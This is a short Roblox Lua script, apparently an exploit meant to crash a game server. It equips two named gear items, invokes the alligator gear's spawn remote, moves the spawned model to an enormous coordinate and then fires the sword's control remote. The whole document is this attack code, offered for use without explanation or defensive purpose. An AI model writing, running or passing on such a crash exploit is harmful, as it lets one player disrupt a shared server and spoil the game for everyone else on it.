local LocalPlayer = game.Players.LocalPlayer

--gears needed: Intergalactic-Sword, From the Vault: Alligator Plushie
--Ids: 170903610, 292969458

local function crashfunction()
    local Character = LocalPlayer.Character
    local Backpack = LocalPlayer:FindFirstChild("Backpack")
    if not (Character and Backpack) then return end
    local AligatorGear = Backpack:FindFirstChild("Balligator") or Character:FindFirstChild("Balligator")
    local Intergalatic = Backpack:FindFirstChild("SpaceSword") or Backpack:FindFirstChild("SpaceSword")
    if not (AligatorGear and Intergalatic) then return end
    if AligatorGear.Parent == Backpack then
        AligatorGear.Parent = Character
    end
    if Intergalatic.Parent == Backpack then
        Intergalatic.Parent = Character
    end
    AligatorGear:WaitForChild("Remote", 5):WaitForChild("Spawn", 5):InvokeServer()
    local aligator = Character:FindFirstChildOfClass("Model")
    aligator:PivotTo(CFrame.new(Vector3.new(8610111412132831051081081215851, 8610111412132831051081081215851,
        8610111412132831051081081215851)))
    Intergalatic:WaitForChild("ControlFunction", 5):InvokeServer("KeyDown", "q")
end

crashfunction()
